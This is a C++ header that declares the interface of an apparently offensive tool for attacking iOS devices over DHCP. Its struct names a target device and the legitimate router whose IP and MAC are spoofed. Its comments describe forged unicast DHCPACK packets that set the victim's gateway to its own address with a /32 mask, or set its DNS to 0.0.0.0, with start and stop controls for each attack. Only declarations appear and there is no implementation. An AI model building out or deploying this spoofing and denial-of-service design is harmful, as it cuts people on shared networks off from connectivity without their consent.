#ifndef IOS_DHCP_VOID_H
#define IOS_DHCP_VOID_H

#include <string>
#include <vector>

/**
 * Structure for iOS DHCP void rule
 */
struct IOSDHCPVoidRule {
    std::string target_mac;      // MAC address of target iOS device
    std::string target_ip;       // Current IP of target iOS device
    std::string router_ip;       // Legitimate router/gateway IP to spoof as source
    std::string router_mac;      // Legitimate router MAC to spoof at Layer 2
    std::string interface_name;  // Network interface to use
    bool nullify_dns;            // If true, set DNS to 0.0.0.0 instead of self-router
};

/**
 * Initialize iOS DHCP void operations
 */
bool ios_dhcp_void_init();

/**
 * Start DHCP self-implosion attack (PRIMARY VOID)
 * Sends unicast DHCPACK with router = client's own IP, /32 subnet mask
 * @param rule The attack parameters
 */
bool ios_dhcp_void_start(const IOSDHCPVoidRule& rule);

/**
 * Start DNS nullification attack (TERTIARY VOID)
 * Sends unicast DHCPACK with DNS = 0.0.0.0
 * @param rule The attack parameters (nullify_dns must be true)
 */
bool ios_dhcp_nullify_dns_start(const IOSDHCPVoidRule& rule);

/**
 * Stop iOS DHCP void attack
 */
void ios_dhcp_void_stop();

/**
 * Check if iOS DHCP void is active
 */
bool ios_dhcp_void_is_active();

/**
 * Cleanup
 */
void ios_dhcp_void_cleanup();

#endif // IOS_DHCP_VOID_H
